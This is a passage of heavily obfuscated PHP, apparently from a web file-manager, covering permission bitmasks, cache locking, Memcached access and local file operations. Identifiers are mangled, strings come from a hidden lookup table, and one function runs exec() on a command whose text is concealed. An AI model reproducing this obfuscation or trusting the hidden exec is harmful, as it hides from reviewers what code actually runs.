if ($äƒûÈí‚) { $›æ„Óê[$úÕ¯‡öù[33]] = array($úÕ¯‡öù[7], $ş‡àÅöî[$äƒûÈí‚]); } $×âø£ = Model($úÕ¯‡öù[1982])->where($›æ„Óê)->count($ã§ñÍ³ş); return (int) $×âø£; } private function optionServer() { $¹¸è‹ş“ =& $_SERVER[¬ÏÕ§Áú]; $ —ĞÄ = $this->diskDriver(); $¸Ú’ßÁÈ = KodIO::defaultDriver(); $€šçÖÁ = array($¹¸è‹ş“[939] => $¸Ú’ßÁÈ[$¹¸è‹ş“[492]]); $øÔÙİ’  = Model($¹¸è‹ş“[565])->where($€šçÖÁ)->sum($¹¸è‹ş“[89]); $’ÔÍŒÈ’ = explode($¹¸è‹ş“[53], $_SERVER[$¹¸è‹ş“[157]]); $†£Á²¨ = $’ÔÍŒÈ’[0]; $•‘¡½Ô‘ = $GLOBALS[$¹¸è‹ş“[6]][$¹¸è‹ş“[21]]; $¬„â³Ó¾ = $•‘¡½Ô‘[$¹¸è‹ş“[1101]]; if ($¬„â³Ó¾ == $¹¸è‹ş“[1089]) { $øÄ¾ø¨ = explode($¹¸è‹ş“[1423], $•‘¡½Ô‘[$¹¸è‹ş“[1100]]); $¬„â³Ó¾ = $øÄ¾ø¨[0]; } if ($¬„â³Ó¾ == $¹¸è‹ş“[1037] || $¬„â³Ó¾ == $¹¸è‹ş“[924]) { $à’òç®¸ = Model()->db()->query($¹¸è‹ş“[2021]); $ŒëèÖğú = $à’òç®¸[0] && isset($à’òç®¸[0][$¹¸è‹ş“[1721]]) ? $à’òç®¸[0][$¹¸è‹ş“[1721]] : 0; $¬„â³Ó¾ = $¹¸è‹ş“[2022] . ($ŒëèÖğú ? $¹¸è‹ş“[8] . $ŒëèÖğú : $¹¸è‹ş“[12]); } $Š„ˆ¶·´ = $GLOBALS[$¹¸è‹ş“[6]][$¹¸è‹ş“[435]][$¹¸è‹ş“[948]]; return array($¹¸è‹ş“[2023] => $ —ĞÄ ? $ —ĞÄ[$¹¸è‹ş“[2024]] : 0, $¹¸è‹ş“[2025] => $ —ĞÄ ? $ —ĞÄ[$¹¸è‹ş“[2026]] : 0, $¹¸è‹ş“[2027] => (int) $¸Ú’ßÁÈ[$¹¸è‹ş“[2024]] * 1024 * 1024 * 1024, $¹¸è‹ş“[2028] => (int) $øÔÙİ’ , $¹¸è‹ş“[2029] => ucfirst($†£Á²¨), $¹¸è‹ş“[2030] => $¹¸è‹ş“[2031] . PHP_VERSION, $¹¸è‹ş“[2032] => phpBuild64() ? 64 : 32, $¹¸è‹ş“[871] => str_replace($¹¸è‹ş“[1264], $¹¸è‹ş“[1117], $¬„â³Ó¾), $¹¸è‹ş“[435] => ucfirst($Š„ˆ¶·´), $¹¸è‹ş“[32] => $_SERVER[$¹¸è‹ş“[2033]]); } private function diskDriver() { $Öæ²«°· =& $_SERVER[¬ÏÕ§Áú]; $©È®·Õ = $Öæ²«°·[8]; $­¤«˜•· = $GLOBALS[$Öæ²«°·[6]][$Öæ²«°·[1447]] == $Öæ²«°·[1448]; if ($­¤«˜•·) { $©È®·Õ = $Öæ²«°·[2034]; if (function_exists($Öæ²«°·[2035])) { exec($Öæ²«°·[2036], $¬È¨ğ–); $©È®·Õ = $¬È¨ğ–[1] . $Öæ²«°·[8]; } } if (!file_exists($©È®·Õ)) { return; } if (!function_exists($Öæ²«°·[2037])) { return; } $úË÷‡ñÄ = @disk_total_space($©È®·Õ); $ÒˆÀàğ = $úË÷‡ñÄ - @disk_free_space($©È®·Õ); return array($Öæ²«°·[2024] => $úË÷‡ñÄ, $Öæ²«°·[2026] => $ÒˆÀàğ); } public function fileChart($ âùöó±) { $ûÔÍá¡ =& $_SERVER[¬ÏÕ§Áú]; if (isset($ âùöó±[$ûÔÍá¡[1837]])) { return Model($ûÔÍá¡[946])->userFileTypeProfile($ âùöó±[$ûÔÍá¡[1837]]); } if (isset($ âùöó±[$ûÔÍá¡[1445]])) { return Model($ûÔÍá¡[946])->groupFileTypeProfile($ âùöó±[$ûÔÍá¡[1445]]); } $Ú³Í„ğå = $this->sourceSize(); $šâ…¼ÒÁ = array($ûÔÍá¡[203] => 0, $ûÔÍá¡[201] => 1); $Ä€ºŒ­£ = Model($ûÔÍá¡[946])->where($šâ…¼ÒÁ)->sum($ûÔÍá¡[89]); $šâ…¼ÒÁ[$ûÔÍá¡[201]] = 2; $°ÑĞıµà = Model($ûÔÍá¡[946])->where($šâ…¼ÒÁ)->sum($ûÔÍá¡[89]); return array($ûÔÍá¡[877] => $Ú³Í„ğå[$ûÔÍá¡[89]], $ûÔÍá¡[1972] => $Ú³Í„ğå[$ûÔÍá¡[1972]], $ûÔÍá¡[1973] => (int) $Ä€ºŒ­£, $ûÔÍá¡[1974] => (int) $°ÑĞıµà); } private function sourceSize() { $•Ø»Şù£ =& $_SERVER[¬ÏÕ§Áú]; $Ø¹úó³¯ = Model($•Ø»Şù£[946])->where(array($•Ø»Şù£[505] => 0))->sum($•Ø»Şù£[89]); $œ´ºÈ›ö = Model($•Ø»Şù£[565])->sum($•Ø»Şù£[89]); if ($œ´ºÈ›ö > $Ø¹úó³¯) { $œ´ºÈ›ö = $Ø¹úó³¯; } return array($•Ø»Şù£[89] => (int) $Ø¹úó³¯, $•Ø»Şù£[1972] => (int) $œ´ºÈ›ö); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $–œ²òØá =& $_SERVER[¬ÏÕ§Áú]; $ş›÷¯Åà = array(array($–œ²òØá[514] => LNG($–œ²òØá[2038]), $–œ²òØá[2039] => $–œ²òØá[2040], $–œ²òØá[2041] => 1, $–œ²òØá[2042] => 1, $–œ²òØá[2043] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($–œ²òØá[514] => LNG($–œ²òØá[2044]), $–œ²òØá[2039] => $–œ²òØá[2045], $–œ²òØá[2041] => 2, $–œ²òØá[2042] => 1, $–œ²òØá[2043] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($–œ²òØá[514] => LNG($–œ²òØá[2046]), $–œ²òØá[2039] => $–œ²òØá[2047], $–œ²òØá[2041] => 3, $–œ²òØá[2042] => 1, $–œ²òØá[2043] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($–œ²òØá[514] => LNG($–œ²òØá[2048]), $–œ²òØá[2039] => $–œ²òØá[2049], $–œ²òØá[2041] => 4, $–œ²òØá[2042] => 1, $–œ²òØá[2043] => self::AUTH_SHOW | self::AUTH_VIEW), array($–œ²òØá[514] => LNG($–œ²òØá[2050]), $–œ²òØá[2039] => $–œ²òØá[2051], $–œ²òØá[2041] => 5, $–œ²òØá[2042] => 1, $–œ²òØá[2043] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($–œ²òØá[514] => LNG($–œ²òØá[2052]), $–œ²òØá[2039] => $–œ²òØá[2053], $–œ²òØá[2041] => 6, $–œ²òØá[2042] => 1, $–œ²òØá[2043] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($–œ²òØá[514] => LNG($–œ²òØá[2054]), $–œ²òØá[2039] => $–œ²òØá[2055], $–œ²òØá[2041] => 7, $–œ²òØá[2042] => 1, $–œ²òØá[2043] => 0)); return $ş›÷¯Åà; } public static function authCheck($¡ôöùÖÛ, $¿šö±í×) { $Ø¸ß¡§‚ =& $_SERVER[¬ÏÕ§Áú]; $¡ôöùÖÛ = intval($¡ôöùÖÛ); if (KodUser::isRoot() && $GLOBALS[$Ø¸ß¡§‚[6]][$Ø¸ß¡§‚[2056]]) { return !0; } if ($¡ôöùÖÛ <= 0) { return !1; } if (($¡ôöùÖÛ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¡ôöùÖÛ & $¿šö±í×); } public static function authCheckShow($ÏëÏ°Ñ) { return self::authCheck($ÏëÏ°Ñ, self::AUTH_SHOW); } public static function authCheckView($¼¦¿µ•¸) { return self::authCheck($¼¦¿µ•¸, self::AUTH_VIEW); } public static function authCheckDownload($ÈÜ’Ç‹) { return self::authCheck($ÈÜ’Ç‹, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¸ùğºıù) { return self::authCheck($¸ùğºıù, self::AUTH_UPLOAD); } public static function authCheckEdit($…’íˆå±) { return self::authCheck($…’íˆå±, self::AUTH_EDIT); } public static function authCheckRemove($Óùò¶öô) { return self::authCheck($Óùò¶öô, self::AUTH_REMOVE); } public static function authCheckShare($±¾ò«ºº) { return self::authCheck($±¾ò«ºº, self::AUTH_SHARE); } public static function authCheckComment($¤íŒ‹¸) { return self::authCheck($¤íŒ‹¸, self::AUTH_COMMENT); } public static function authCheckEvent($ªñ“í˜) { return self::authCheck($ªñ“í˜, self::AUTH_EVENT); } public static function authCheckRoot($å‚ıæ¿) { return self::authCheck($å‚ıæ¿, self::AUTH_ROOT); } public static function authCheckAction($¥Òåç“´, $±¥°Ã ) { $÷òÎ‹… =& $_SERVER[¬ÏÕ§Áú]; $’Á–²ƒ = array($÷òÎ‹…[2057] => self::AUTH_VIEW, $÷òÎ‹…[1334] => self::AUTH_DOWNLOAD, $÷òÎ‹…[120] => self::AUTH_UPLOAD, $÷òÎ‹…[2007] => self::AUTH_EDIT, $÷òÎ‹…[1282] => self::AUTH_REMOVE, $÷òÎ‹…[2017] => self::AUTH_SHARE, $÷òÎ‹…[440] => self::AUTH_COMMENT, $÷òÎ‹…[1824] => self::AUTH_EVENT, $÷òÎ‹…[2058] => self::AUTH_ROOT); if (!isset($’Á–²ƒ[$±¥°Ã ])) { return; } $óÎ•—Èô = $’Á–²ƒ[$±¥°Ã ]; $¥Òåç“´ = intval($¥Òåç“´); if ($¥Òåç“´ <= 0) { return !1; } if (($¥Òåç“´ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¥Òåç“´ & $óÎ•—Èô); } public static function authDisable($»ùêê, $²‡šÑŸŸ) { if (intval($»ùêê) <= 0) { return 0; } return intval($»ùêê) & ~$²‡šÑŸŸ; } public $optionType = "\x53\x79\x73\x74\145\x6d\56\x73\x6f\x75\x72\x63\145\x41\165\164\150\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\141\x75\x74\x68", "\154\x61\x62\145\154", "\144\x69\163\x70\154\x61\171", "\163\171\x73\164\x65\x6d", "\163\157\x72\x74"); public function initData() { $ú›ı«şŠ = $this->authDefault(); foreach ($ú›ı«şŠ as $¹³ØßÊ´) { $this->add($¹³ØßÊ´); } } public function findAuth($á“áäÏ³, $ÃåÛî¶) { $¦Š¶Ü…æ =& $_SERVER[¬ÏÕ§Áú]; $§ıòÖú‘ = parent::listData(); foreach ($§ıòÖú‘ as $†üòîéÓ) { $’¦­¦ºı = intval($†üòîéÓ[$¦Š¶Ü…æ[507]]); if ($’¦­¦ºı <= 0 || $†üòîéÓ[$¦Š¶Ü…æ[2059]] == 0) { continue; } if (($’¦­¦ºı & $á“áäÏ³) != $á“áäÏ³) { continue; } if (($’¦­¦ºı & $ÃåÛî¶) != 0) { continue; } return $†üòîéÓ[$¦Š¶Ü…æ[492]]; } return !1; } public function findAuthMax($§ÎË‡ç’, $°£…¨±ß) { $•ï½¸í¤ =& $_SERVER[¬ÏÕ§Áú]; $ˆ–±”Á = !1; $ÚÌ¸ÖĞ = parent::listData(); foreach ($ÚÌ¸ÖĞ as $ˆé¦­¾) { $ß˜ÜÛâØ = intval($ˆé¦­¾[$•ï½¸í¤[507]]); if ($ß˜ÜÛâØ <= 0 || $ˆé¦­¾[$•ï½¸í¤[2059]] == 0) { continue; } if (($ß˜ÜÛâØ & $§ÎË‡ç’) != $§ÎË‡ç’) { continue; } if (($ß˜ÜÛâØ & $°£…¨±ß) != 0) { continue; } if (!$ˆ–±”Á) { $ˆ–±”Á = $ˆé¦­¾; continue; } if (intval($ˆ–±”Á[$•ï½¸í¤[507]]) < $ß˜ÜÛâØ) { $ˆ–±”Á = $ˆé¦­¾; } } return $ˆ–±”Á ? $ˆ–±”Á[$•ï½¸í¤[492]] : !1; } public function findAuthReadOnly() { $¿×…ôÁÊ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $«ÍßÀ¸ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¿×…ôÁÊ, $«ÍßÀ¸); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $€šú®Î =& $_SERVER[¬ÏÕ§Áú]; $ÁêĞü¢è = parent::listData(); $ĞŞ­­ßÑ = !1; foreach ($ÁêĞü¢è as $”ã¹ÆŸ) { if ($”ã¹ÆŸ[$€šú®Î[507]] <= 0 || $”ã¹ÆŸ[$€šú®Î[2059]] == $€šú®Î[241]) { continue; } if (!$ĞŞ­­ßÑ) { $ĞŞ­­ßÑ = $”ã¹ÆŸ; continue; } if ($ĞŞ­­ßÑ[$€šú®Î[507]] > $”ã¹ÆŸ[$€šú®Î[507]]) { $ĞŞ­­ßÑ = $”ã¹ÆŸ; } } return $ĞŞ­­ßÑ ? $ĞŞ­­ßÑ[$€šú®Î[492]] : $€šú®Î[12]; } public function listData($ÏÅÓàŞË = false, $¡ÒÛ†Œ = "\163\157\x72\x74", $…—ÀÍ•‘ = false) { return parent::listData($ÏÅÓàŞË, $¡ÒÛ†Œ, $…—ÀÍ•‘); } public function update($¾¥´şïá, $á”°·Ã—) { $®—ô¥Ù =& $_SERVER[¬ÏÕ§Áú]; $€¬…©‘ø = parent::listData($¾¥´şïá); $­îğüø¶ = $this->findByName($á”°·Ã—[$®—ô¥Ù[32]]); if (!$€¬…©‘ø || $­îğüø¶ && $­îğüø¶[$®—ô¥Ù[492]] != $€¬…©‘ø[$®—ô¥Ù[492]]) { return !1; } $this->filterAuth($á”°·Ã—[$®—ô¥Ù[507]]); return parent::update($¾¥´şïá, $á”°·Ã—); } public function remove($Á›£í‰Ü) { $ÙËÃÖ£ó = parent::listData($Á›£í‰Ü); if (!$ÙËÃÖ£ó || $ÙËÃÖ£ó[$_SERVER[¬ÏÕ§Áú][202]]) { return !1; } return parent::remove($Á›£í‰Ü); } public function add($„¾à‰‚ = array()) { $Æö´àöÛ =& $_SERVER[¬ÏÕ§Áú]; if ($this->findByName($„¾à‰‚[$Æö´àöÛ[32]])) { return !1; } $ÖÆØ“øƒ = array($Æö´àöÛ[32] => $Æö´àöÛ[12], $Æö´àöÛ[507] => 1, $Æö´àöÛ[2060] => $Æö´àöÛ[2047], $Æö´àöÛ[2059] => 1, $Æö´àöÛ[202] => 0, $Æö´àöÛ[2061] => 0); $„¾à‰‚ = array_merge($ÖÆØ“øƒ, $„¾à‰‚); $„¾à‰‚[$Æö´àöÛ[2061]] = $this->getSort(); $this->filterAuth($„¾à‰‚[$Æö´àöÛ[507]]); return parent::insert($„¾à‰‚); } private function getSort() { $¦¡…è¾ =& $_SERVER[¬ÏÕ§Áú]; $ãùüÜ› = parent::listData(); $ô‚µ‹¢„ = array_to_keyvalue($ãùüÜ›, $¦¡…è¾[12], $¦¡…è¾[2061]); return empty($ô‚µ‹¢„) ? 0 : max($ô‚µ‹¢„) + 1; } private function filterAuth(&$×¾ÖİŒ‚) { if (!$×¾ÖİŒ‚) { return; } $Üêü‹ÌÍ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¯€áşÙ¡ = array(); foreach ($Üêü‹ÌÍ as $šÂÁøŠÙ) { if ($×¾ÖİŒ‚ & $šÂÁøŠÙ) { $¯€áşÙ¡[] = $šÂÁøŠÙ; } } if (in_array(self::AUTH_ROOT, $¯€áşÙ¡)) { $×¾ÖİŒ‚ = array_sum($Üêü‹ÌÍ); return; } $Şö·§ˆè = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¯€áşÙ¡ as $šÂÁøŠÙ) { if (isset($Şö·§ˆè[$šÂÁøŠÙ])) { $¯€áşÙ¡ = array_merge($¯€áşÙ¡, $Şö·§ˆè[$šÂÁøŠÙ]); } } $¯€áşÙ¡[] = self::AUTH_SHOW; $×¾ÖİŒ‚ = array_sum(array_unique($¯€áşÙ¡)); } public function sort($†¸©ºÓò, $•ùí—Ï³) { return parent::update($†¸©ºÓò, $•ùí—Ï³); } } goto C¿ŸÇÎÊ•§; a‚Ê¾î¹„Ó: function binCheckBigger($şé£§Ïİ, $»ùåò“) { return $şé£§Ïİ > $»ùåò“; } $_SERVER[$_SERVER[ß–ùË‹][3]] = ("\70\70\62\64"."\x37\x37")+0;$_92iu="x7q2f5rytbwpmh4zjegav9onc0s68k1iuld343xhz2kgrbo7lj8qu0we16iaf9ptvcym5sdn5hztygiq";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ğËŞ¼ŸÇ, $–Šßë±•) { $œĞÚÕŠ” =& $_SERVER[¬ÏÕ§Áú]; if (isset(self::$_methodList[$ğËŞ¼ŸÇ])) { return @call_user_func_array(self::$_methodList[$ğËŞ¼ŸÇ], $–Šßë±•); } else { if (method_exists($this, $ğËŞ¼ŸÇ)) { return call_user_func_array(array($this, $ğËŞ¼ŸÇ), $–Šßë±•); } else { think_exception(__CLASS__ . $œĞÚÕŠ”[4] . $ğËŞ¼ŸÇ . $œĞÚÕŠ”[5]); } } } public static function __callStatic($æÂÖá•Ÿ, $Ïë²ÏêË) { if (isset(self::$_methodListStatic[$æÂÖá•Ÿ])) { return call_user_func_array(self::$_methodListStatic[$æÂÖá•Ÿ], $Ïë²ÏêË); } else { if (method_exists(self, $æÂÖá•Ÿ)) { return call_user_func_array(array(self, $æÂÖá•Ÿ), $Ïë²ÏêË); } else { show_json("{$æÂÖá•Ÿ}\x28\x29\40\156\x6f\x74\x20\145\170\x69\x73\x74\x3b", !1); } } } public static function addMethod($¾ĞÙæÇ½, $¶ÈÏ’Õˆ) { self::$_methodList[$¾ĞÙæÇ½] = $¶ÈÏ’Õˆ; } public static function addMethodStatic($»å÷·Ó, $íòøÇ§) { self::$_methodListStatic[$»å÷·Ó] = $íòøÇ§; } } goto BæˆÀŸ…ò£; E¨Õ…ï½À: class CacheLockMemcached { public function lock($şÅ †ÈÃ, $‹¶á‰Áè = 0) { $ûû¸Ò²Â = Cache::init(); $šªïÀù = microtime(!0) + $‹¶á‰Áè; while (microtime(!0) < $šªïÀù) { $ã€„—ô = $ûû¸Ò²Â->get($şÅ †ÈÃ); if (!$ã€„—ô || $ã€„—ô < microtime(!0)) { $›Ò‘íü… = $ûû¸Ò²Â->handle->add($şÅ †ÈÃ, $šªïÀù, $‹¶á‰Áè); if ($›Ò‘íü…) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ëù¡øœ) { return Cache::init()->get($Ëù¡øœ); } public function unlock($¾ıªÒÁƒ) { return Cache::init()->remove($¾ıªÒÁƒ); } } class CacheLockDatabase { public function lock($†˜­ŠÛ¢, $ç Öü“ = 0) { $ËÄ°­Ò™ = Model($_SERVER[¬ÏÕ§Áú][950]); $Í»¼Èí = microtime(!0) + $ç Öü“; while (microtime(!0) < $Í»¼Èí) { $¡÷Ğêïª = $ËÄ°­Ò™->get($†˜­ŠÛ¢); if (!$¡÷Ğêïª || $¡÷Ğêïª < microtime(!0)) { $¤ˆß£È = $ËÄ°­Ò™->set($†˜­ŠÛ¢, $Í»¼Èí); if ($¤ˆß£È) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ıíÂ¢¡) { return Model($_SERVER[¬ÏÕ§Áú][950])->get($ıíÂ¢¡); } public function unlock($šåÕÖ•È) { Model($_SERVER[¬ÏÕ§Áú][950])->remove($šåÕÖ•È); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ùıÈ“Ú½, $ı¿•í™—) { $üÊ¿¨÷Ì =& $_SERVER[¬ÏÕ§Áú]; if (!class_exists($üÊ¿¨÷Ì[992])) { show_json($üÊ¿¨÷Ì[993], !1); } $this->cacheTime = $ı¿•í™—; $this->handle = new Memcached(); if (is_array($ùıÈ“Ú½[$üÊ¿¨÷Ì[994]]) && count($ùıÈ“Ú½[$üÊ¿¨÷Ì[994]]) >= 1) { foreach ($ùıÈ“Ú½[$üÊ¿¨÷Ì[994]] as $¶ùëº¢¬) { $¥¥Ç„Íú = explode($üÊ¿¨÷Ì[4], $¶ùëº¢¬); $this->handle->addServer($¥¥Ç„Íú[0], $¥¥Ç„Íú[1]); } } else { $this->handle->addServer($ùıÈ“Ú½[$üÊ¿¨÷Ì[219]], $ùıÈ“Ú½[$üÊ¿¨÷Ì[220]]); } } public function set($šâ§ ‰Ÿ, $†İ’¥çÔ, $ë’èú°– = false) { $ë’èú°– = $ë’èú°– ? $ë’èú°– : $this->cacheTime; return $this->handle->set($šâ§ ‰Ÿ, $†İ’¥çÔ, $ë’èú°–); } public function get($Ã¨ÇÛá) { return $this->handle->get($Ã¨ÇÛá); } public function remove($·ã¢µİá) { return $this->handle->delete($·ã¢µİá); } public function deleteAll() { return $this->handle->flush(); } } goto B¨ŠÙñ‡ƒ; Fê—µÈ¿‚ë: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ú©§½˜©) { if (substr($ú©§½˜©, 0, 2) == $_SERVER[¬ÏÕ§Áú][1473]) { $ú©§½˜© = BASIC_PATH . substr($ú©§½˜©, 2); } return $ú©§½˜©; } public function iconvApp($Ãœãƒ¹Ñ) { $ÕÈ…œŸÙ =& $_SERVER[¬ÏÕ§Áú]; global $config; return $this->iconvTo($Ãœãƒ¹Ñ, $config[$ÕÈ…œŸÙ[1502]], $config[$ÕÈ…œŸÙ[1501]]); } public function iconvSystem($È”­Ç–ƒ) { $ùÔÇî¹ =& $_SERVER[¬ÏÕ§Áú]; global $config; return $this->iconvTo($È”­Ç–ƒ, $config[$ùÔÇî¹[1501]], $config[$ùÔÇî¹[1502]]); } public function getPathOuter($•Ô¿Ü„¹) { $±ıË„Å’ =& $_SERVER[¬ÏÕ§Áú]; $×ş¼Ãø = $this->iconvApp($this->pathBase); $•Ô¿Ü„¹ = $this->iconvApp($•Ô¿Ü„¹); if (substr($×ş¼Ãø, 0, 2) == $±ıË„Å’[1473]) { $×ş¼Ãø = BASIC_PATH . substr($×ş¼Ãø, 2); } if (substr($•Ô¿Ü„¹, 0, 2) == $±ıË„Å’[1473]) { $•Ô¿Ü„¹ = BASIC_PATH . substr($•Ô¿Ü„¹, 2); } $×ş¼Ãø = KodIO::clear($×ş¼Ãø); $•Ô¿Ü„¹ = KodIO::clear($•Ô¿Ü„¹); $•Ô¿Ü„¹ = substr($•Ô¿Ü„¹, strlen($×ş¼Ãø)); if (empty($this->pathDriver)) { return $•Ô¿Ü„¹; } return $this->pathDriver . $±ıË„Å’[8] . ltrim($•Ô¿Ü„¹, $±ıË„Å’[8]); } public function mkfile($“ñÎ”äª, $ËÉ‡™ëÃ = '', $«¢äÏÑÆ = REPEAT_RENAME) { $“ñÎ”äª = $this->iconvSystem($“ñÎ”äª); @touch($“ñÎ”äª); if ($ËÉ‡™ëÃ) { file_put_contents($“ñÎ”äª, $ËÉ‡™ëÃ); } @chmod($“ñÎ”äª, $this->pathAuth); if (is_file($“ñÎ”äª)) { return $this->getPathOuter($“ñÎ”äª); } $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); return !1; } public function mkdir($ÑƒÉ´›·, $¨Ø²ş–´ = REPEAT_SKIP) { $ÑƒÉ´›· = $this->iconvSystem($ÑƒÉ´›·); if (is_dir($ÑƒÉ´›·)) { return $this->getPathOuter($ÑƒÉ´›·); } @mkdir($ÑƒÉ´›·, $this->pathAuth, !0); @chmod($ÑƒÉ´›·, $this->pathAuth); if (is_dir($ÑƒÉ´›·)) { return $this->getPathOuter($ÑƒÉ´›·); } $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); return !1; } public function copyFile($“ƒ¾óä, $™­ºœ¬×) { $this->mkdir($this->pathFather($™­ºœ¬×)); $“ƒ¾óä = $this->iconvSystem($“ƒ¾óä); $™­ºœ¬× = $this->iconvSystem($™­ºœ¬×); $ñèº¿Îí = copy_64($“ƒ¾óä, $™­ºœ¬×); @chmod($™­ºœ¬×, $this->pathAuth); if ($ñèº¿Îí) { return $this->getPathOuter($™­ºœ¬×); } $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); return !1; } public function moveFile($¹³îö„Û, $ õ‹×) { $this->mkdir($this->pathFather($ õ‹×)); $¹³îö„Û = $this->iconvSystem($¹³îö„Û); $ õ‹× = $this->iconvSystem($ õ‹×); $ğş·è¿ = intval(@rename($¹³îö„Û, $ õ‹×)); if (!$ğş·è¿) { if ($ğş·è¿ = intval(@copy_64($¹³îö„Û, $ õ‹×))) { @unlink($¹³îö„Û); } } @chmod($ õ‹×, $this->pathAuth); if ($ğş·è¿) { return $this->getPathOuter($ õ‹×); } $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); return !1; } public function movePath($’’éáê©, $öªíí¬è, $ãÂ‘ŠÄ  = false) { $ƒø˜ƒÛ =& $_SERVER[¬ÏÕ§Áú]; $’’éáê© = $this->iconvSystem($’’éáê©); $öªíí¬è = $this->iconvSystem($öªíí¬è); $©¨¢Ù¡ì = rtrim($öªíí¬è, $ƒø˜ƒÛ[8]) . $ƒø˜ƒÛ[8] . ($ãÂ‘ŠÄ  ? $ãÂ‘ŠÄ  : get_path_this($’’éáê©)); if (file_exists($©¨¢Ù¡ì)) { return !1; } $¤ï©Ò¢í = intval(@rename($’’éáê©, $©¨¢Ù¡ì)); $¤ï©Ò¢í = file_exists($©¨¢Ù¡ì); if ($¤ï©Ò¢í) { return $this->getPathOuter($©¨¢Ù¡ì); } $this->writeLog(__FUNCTION__ . $ƒø˜ƒÛ[1513], !0); return !1; } public function delFile($ñà»Üèª) { $ñà»Üèª = $this->iconvSystem($ñà»Üèª); if (!@unlink($ñà»Üèª)) { @chmod($ñà»Üèª, $this->pathAuth); if (@unlink($ñà»Üèª)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); return !1; } return !0; } public function delFolder($…‚ö®Ïš) { $õõ€ï‚Í =& $_SERVER[¬ÏÕ§Áú]; $…‚ö®Ïš = $this->iconvSystem($…‚ö®Ïš); if (!is_dir($…‚ö®Ïš)) { return !0; } if (!($¸Ş·Ä¾ = opendir($…‚ö®Ïš))) { return !1; } while (($ğ‚†µ¶– = readdir($¸Ş·Ä¾)) !== !1) { if ($ğ‚†µ¶– == $õõ€ï‚Í[10] || $ğ‚†µ¶– == $õõ€ï‚Í[1418]) { continue; } $÷å½—õæ = $…‚ö®Ïš . $õõ€ï‚Í[8] . $ğ‚†µ¶–; if (is_file($÷å½—õæ) || is_link($÷å½—õæ)) { if (!unlink($÷å½—õæ)) { chmod($÷å½—õæ, $this->pathAuth); if (!unlink($÷å½—õæ)) { return !1; } } } else { if (is_dir($÷å½—õæ)) { chmod($÷å½—õæ, $this->pathAuth); $÷å½—õæ = $this->iconvApp($÷å½—õæ); if (!$this->delFolder($÷å½—õæ)) { return !1; } } } } closedir($¸Ş·Ä¾); return rmdir($…‚ö®Ïš); } public function rename($ÀîÅœüì, $¼¦ÃƒŠ) { $îŞ‰¼Æ† =& $_SERVER[¬ÏÕ§Áú]; $±ğ‘¢Ìä = $this->fileNameAuto($this->pathFather($ÀîÅœüì), $¼¦ÃƒŠ); $±ğ‘¢Ìä = $this->iconvSystem($±ğ‘¢Ìä); $ÀîÅœüì = $this->iconvSystem($ÀîÅœüì); $ô­–ºüñ = $this->pathFather($ÀîÅœüì); $á°É”Ÿ = rtrim($ô­–ºüñ, $îŞ‰¼Æ†[8]) . $îŞ‰¼Æ†[8] . $±ğ‘¢Ìä; $¥‰íÅş = @rename($ÀîÅœüì, $á°É”Ÿ); $á°É”Ÿ = $this->iconvApp($á°É”Ÿ); if ($¥‰íÅş) { return $this->getPathOuter($á°É”Ÿ); } $this->writeLog(__FUNCTION__ . $îŞ‰¼Æ†[1513], !0); return !1; } public function size($Â»Ÿ·Ú°) { $Â»Ÿ·Ú° = $this->iconvSystem($Â»Ÿ·Ú°); return 